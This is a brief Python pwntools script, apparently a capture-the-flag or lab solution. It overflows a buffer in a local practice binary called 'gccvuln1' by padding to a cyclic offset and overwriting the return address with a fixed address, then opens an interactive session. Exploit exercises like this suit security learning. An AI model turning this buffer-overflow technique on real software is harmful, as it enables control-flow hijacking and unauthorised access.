from pwn import *

p = process('./gccvuln1')

payload = cyclic(cyclic_find('aafa'))
payload += p64(0x000000000040125b)

p.sendline(payload)
p.interactive()

